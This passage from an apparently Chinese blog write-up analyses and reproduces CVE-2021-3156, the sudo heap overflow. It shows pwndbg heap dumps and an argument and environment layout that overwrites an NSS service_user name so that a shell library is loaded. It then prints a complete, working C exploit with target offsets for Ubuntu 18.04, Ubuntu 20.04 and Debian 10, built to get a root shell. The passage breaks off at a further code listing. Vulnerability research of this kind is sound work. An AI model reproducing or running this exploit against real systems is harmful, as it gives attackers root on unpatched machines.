size-0x10</code>。</p><p>这里需要注意的一个问题就是，在进行环境变量加载的过程中会对于每一个不同<code>size</code>的堆块，都会释放一个<code>size+0x10</code>大小的堆块，这是路径拼接造成的。但是相同<code>size</code>大小的会复用同一个堆块，因此在<code>tcache</code>中不同<code>size</code>大小的堆块只会额外产生<code>1</code>个<code>size+0x10</code>大小的堆块。需要注意的是对于<code>size</code>比较小的堆块，由于<code>getlocale</code>中堆块的申请比较多，因此可能会被申请回去，目前可以肯定的是对于<code>0x80</code>或者大于<code>0x80</code>的附加堆块会保存在<code>tcache</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555582580</span> (size : <span class="number">0x1da80</span>)</span><br><span class="line">       last_remainder: <span class="number">0x5555555814b0</span> (size : <span class="number">0xf90</span>)</span><br><span class="line">            unsortbin: <span class="number">0x5555555814b0</span> (size : <span class="number">0xf90</span>)</span><br><span class="line">(<span class="number">0x20</span>)   tcache_entry[<span class="number">0</span>](<span class="number">1</span>): <span class="number">0x5555555814a0</span></span><br><span class="line">(<span class="number">0x40</span>)   tcache_entry[<span class="number">2</span>](<span class="number">3</span>): <span class="number">0x55555557ff40</span> --&gt; <span class="number">0x555555580620</span> --&gt; <span class="number">0x555555581380</span><span class="comment">// group files</span></span><br><span class="line">(<span class="number">0x70</span>)   tcache_entry[<span class="number">5</span>](<span class="number">1</span>): <span class="number">0x555555580cb0</span> <span class="comment">// 环境变量释放产生的0x70堆块</span></span><br><span class="line">(<span class="number">0x80</span>)   tcache_entry[<span class="number">6</span>](<span class="number">1</span>): <span class="number">0x555555580a90</span> <span class="comment">// user_args堆块，是附加堆块</span></span><br><span class="line">(<span class="number">0x1e0</span>)   tcache_entry[<span class="number">28</span>](<span class="number">1</span>): <span class="number">0x55555557f2a0</span></span><br><span class="line">(<span class="number">0x410</span>)   tcache_entry[<span class="number">63</span>](<span class="number">1</span>): <span class="number">0x55555557f500</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里由于<code>ubuntu 20.04</code>下面我在调试的时候<code>execve</code>执行之后<code>sudo main</code>函数执行之前就会有一个<code>0x80</code>的堆块，不知道什么原因，因此这里直接释放<code>0x80</code>的堆块会有问题，因此这里我是用附加堆块来实现<code>0x80</code>大小的堆块的效果。</p><p>拿到上述的堆布局之后就可以将<code>user_args</code>长度设置为<code>0x80</code>，申请得到<code>0x555555580a90</code>堆块，之后就可以覆写<code>0x555555581380</code>的<code>group files service_user</code>结构体了。</p><blockquote><p>这里需要注意的是在溢出的时候不能溢出group files太多，会直接覆写到service_table也就是上面那个0x20大小的堆块，应该是在最后一次参数拷贝的时候恰好覆写到service_user结构体的name字段。不多覆写。</p></blockquote><p>这里我们看到堆块之间的差值是<code>0x8f0</code>，我们需要覆写这些长度。中间这些堆块都是在进行<code>setlocale</code>中产生的，对之后的程序进行没有影响，可以直接覆写。根据之前溢出的规则，遇到<code>\\\\</code>就会继续向后读。目前<code>exp</code>中参数设置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;sudoedit&quot;</span>, <span class="string">&quot;-s&quot;</span>, smash_a, <span class="string">&quot;\\\\&quot;</span>, smash_b, NULL, envp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参数和环境变量在内存中的表现方式如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// argv-&gt;0x7ffc304d1a18</span><br><span class="line">pwndbg&gt; telescope 0x7ffc304d1a18</span><br><span class="line">00:0000│ rdx  0x7ffc304d1a18 —▸ 0x7ffc304d1df6 ◂— <span class="string">&#x27;sudoedit&#x27;</span></span><br><span class="line">01:0008│      0x7ffc304d1a20 —▸ 0x7ffc304d1dff ◂— 0x414141414100732d /* <span class="string">&#x27;-s&#x27;</span> */</span><br><span class="line">02:0010│      0x7ffc304d1a28 —▸ 0x7ffc304d1e02 ◂— <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\&#x27;</span></span><br><span class="line">03:0018│      0x7ffc304d1a30 —▸ 0x7ffc304d1e3c ◂— 0x424242424242005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">04:0020│      0x7ffc304d1a38 —▸ 0x7ffc304d1e3e ◂— <span class="string">&#x27;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\\\&#x27;</span></span><br><span class="line">05:0028│      0x7ffc304d1a40 ◂— 0x0</span><br><span class="line">06:0030│      0x7ffc304d1a48 —▸ 0x7ffc304d1e76 ◂— 0x5c005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">07:0038│      0x7ffc304d1a50 —▸ 0x7ffc304d1e78 ◂— 0x5c005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">//...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">40:0200│   0x7ffc304d1c18 —▸ 0x7ffc304d1eea ◂— 0x5c005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">41:0208│   0x7ffc304d1c20 —▸ 0x7ffc304d1eec ◂— 0x5c005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">42:0210│   0x7ffc304d1c28 —▸ 0x7ffc304d1eee ◂— 0x2f58005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">43:0218│   0x7ffc304d1c30 —▸ 0x7ffc304d1ef0 ◂— 0x30502f58005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">44:0220│   0x7ffc304d1c38 —▸ 0x7ffc304d1ef2 ◂— 0x5f5030502f58005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">45:0228│   0x7ffc304d1c40 —▸ 0x7ffc304d1ef4 ◂— <span class="string">&#x27;X/P0P_SH3LLZ_&#x27;</span></span><br><span class="line">46:0230│   0x7ffc304d1c48 —▸ 0x7ffc304d1f02 ◂— 0x433d4c4c415f434c (<span class="string">&#x27;LC_ALL=C&#x27;</span>)</span><br><span class="line">47:0238│   0x7ffc304d1c50 ◂— 0x0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意的是栈中每一个参数的结尾依靠的是<code>\\\\</code>。首先第一次复制，遇到<code>\\\\</code>会将<code>\\\\, smash_b, envp</code>拷贝一遍，然后是第二次复制，参数即为<code>\\\\</code>因此会将<code>smash_b,envp</code>拷贝一遍，接着是<code>smash_b</code>，由于<code>smash_b</code>之后也是<code>\\\\</code>，因此会一直继续拷贝，也就是将<code>envp</code>拷贝了一遍。借着就结束拷贝了。也就是说<code>smash_b,envp</code>都被拷贝了三遍，<code>smash_a</code>被拷贝了一遍。注意到每一次拷贝结束都会在结尾处加<code>space</code>即空格（最后一个空格会被覆写为<code>0</code>）。在设定<code>smash_a,smash_b,envp</code>的长度的时候基本就是<code>user_args/2</code>即为<code>smash_a,smash_b</code>的值，剩余的值<code>/3</code>就是<code>envp</code>的长度，不够的话再用<code>smash_a</code>的长度进行微调。</p><p>当我们覆写完毕<code>group service_user</code>结构体的<code>name</code>字段之后，<code>sudo</code>会经过一系列的调用直到<code>nss_load_library</code>最终打开<code>getshell</code>的动态链接库。</p><p>关于动态链接库编译有无空格的问题，如果是精准覆写<code>name</code>，那么就不需要空格，因为之后会被覆写为<code>0</code>，否则就需要空格。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2021-3156-sudo-heap-based-bufoverflow/1.png" alt="CVE-2021-3156%20sudo%20heap-based%20bufoverflow%20%E5%A4%8D%E7%8E%B0&amp;%E5%88%86%E6%9E%90%20f65c00b177cf4be1b02b394f2a54fb87/Untitled%201.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span></span><br><span class="line"><span class="comment"> ** ===========================================</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Exploit for that sudo heap overflow thing everyone is talking about.</span></span><br><span class="line"><span class="comment"> ** This one aims for singleshot. Does not fuck with your system files.</span></span><br><span class="line"><span class="comment"> ** No warranties.</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Shout outs to:</span></span><br><span class="line"><span class="comment"> **   Qualys      - for pumping out the awesome bugs</span></span><br><span class="line"><span class="comment"> **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)</span></span><br><span class="line"><span class="comment"> **   dsc         - for letting me rack up his electricity bill</span></span><br><span class="line"><span class="comment"> **   my wife     - for all the quality time we had to skip</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **  Enjoy!</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **   -- blasty // 20210130</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 512 environment variables should be enough for everyone</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ENVP 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> *target_name;</span><br><span class="line">        <span class="type">char</span> *sudoedit_path;</span><br><span class="line">        <span class="type">uint32_t</span> smash_len_a;</span><br><span class="line">        <span class="type">uint32_t</span> smash_len_b;</span><br><span class="line">        <span class="type">uint32_t</span> null_stomp_len;</span><br><span class="line">        <span class="type">uint32_t</span> lc_all_len;</span><br><span class="line">&#125; <span class="type">target_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *lc_names[]=&#123;</span><br><span class="line">        <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_PAPER&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_NAME&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_ADDRESS&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_TELEPHONE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MEASUREMENT&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_IDENTIFICATION&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">target_t</span> targets[] = &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Yes, same values as 20.04.1, but also confirmed.</span></span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">58</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">0x30</span></span><br><span class="line">        <span class="comment">// .lc_all_len     = 212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">58</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">64</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">49</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">60</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">214</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> *prog)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  usage: %s &lt;target&gt;\\n\\n&quot;</span>, prog);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  available targets:\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    %d) %s\\n&quot;</span>, i, targets[i].target_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\\n\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> target_idx = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_idx &lt; <span class="number">0</span> || target_idx &gt;= (<span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>))) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;invalid target index\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">target_t</span> *target = &amp;targets[ target_idx ];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;using target: &#x27;%s&#x27;\\n&quot;</span>, target-&gt;target_name);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *smash_a = <span class="built_in">calloc</span>(target-&gt;smash_len_a + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *smash_b = <span class="built_in">calloc</span>(target-&gt;smash_len_b + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(smash_a, <span class="string">&#x27;A&#x27;</span>, target-&gt;smash_len_a);</span><br><span class="line">    <span class="built_in">memset</span>(smash_b, <span class="string">&#x27;B&#x27;</span>, target-&gt;smash_len_b);</span><br><span class="line"></span><br><span class="line">    smash_a[target-&gt;smash_len_a] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">    smash_b[target-&gt;smash_len_b] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_argv[]=&#123;</span><br><span class="line">        <span class="comment">// &quot;sudoedit&quot;, &quot;-s&quot;, smash_a, &quot;\\\\&quot;, NULL</span></span><br><span class="line">        <span class="comment">// &quot;sudoedit&quot;, &quot;-s&quot;, smash_a, NULL</span></span><br><span class="line">        <span class="string">&quot;sudoedit&quot;</span>, <span class="string">&quot;-s&quot;</span>, smash_a, <span class="string">&quot;\\\\&quot;</span>, smash_b, <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_envp[MAX_ENVP];</span><br><span class="line">    <span class="type">int</span> envp_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">0x2b6</span>); i++) &#123;</span><br><span class="line">        s_envp[envp_pos++] = <span class="string">&quot;\\\\&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s_envp[envp_pos++] = <span class="string">&quot;X/P0P_SH3LLZ_&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> lc_len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="type">int</span> lc_num = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *temp=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">11</span>; i &gt; (<span class="number">11</span> - lc_num); i--)&#123;</span><br><span class="line">        temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">        s_envp[envp_pos++] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    temp = <span class="built_in">calloc</span>(<span class="number">0x50</span> + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, <span class="number">0x50</span>);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">    i -= <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);</span></span><br><span class="line">    <span class="comment">// strcpy(temp, lc_names[i]);</span></span><br><span class="line">    <span class="comment">// strcpy(temp + strlen(lc_names[i]), &quot;=C.UTF-8@&quot;);</span></span><br><span class="line">    <span class="comment">// memset(temp+strlen(lc_names[i]) + 9, &#x27;A&#x27;+i, 0x60);</span></span><br><span class="line">    <span class="comment">// s_envp[envp_pos++] = temp;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// i -= 1;</span></span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line">    i-=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=XXXXXXXX&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">    s_envp[envp_pos++] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;** pray for your rootshell.. **\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(target-&gt;sudoedit_path, s_argv, s_envp);</span><br><span class="line">    <span class="comment">// execve(target-&gt;sudoedit_path, s_argv, NULL);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的<code>exp</code>与原始的<code>exp</code>不同，原始的<code>exp</code>是用<code>LC_ALL</code>此时会在<code>sudo_conf_read</code>函数中调用<code>setlocale(LC_ALL, &quot;C&quot;),setlocale(LC_ALL, prev_locale)</code>会申请和释放大量的堆块，此时也会释放<code>_nl_global_locale.__names</code>中保存的堆块地址其实就是<code>newnames</code>中的堆块地址也就是存储我们环境变量值的堆块，通过释放大量的<code>0xf0</code>堆块进入<code>unsorted bin</code>，然后再申请<code>0x20</code>的时候，制造一个<code>0xd0</code>大小的<code>small bin</code>。此时还会有一个<code>unsorted bin</code>，由于在<code>get_user_info</code>会申请一个<code>0x80,0x1000</code>的堆块，此时<code>small bin,unsorted bin</code>会互换位置，也就是<code>0x80</code>大小的堆块和<code>group files service_user</code>会在<code>unsorted bin</code>相邻的位置申请，非常的巧妙。</p><p>初始的<code>exp</code>，<code>lib</code>，<code>Makefile</code>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 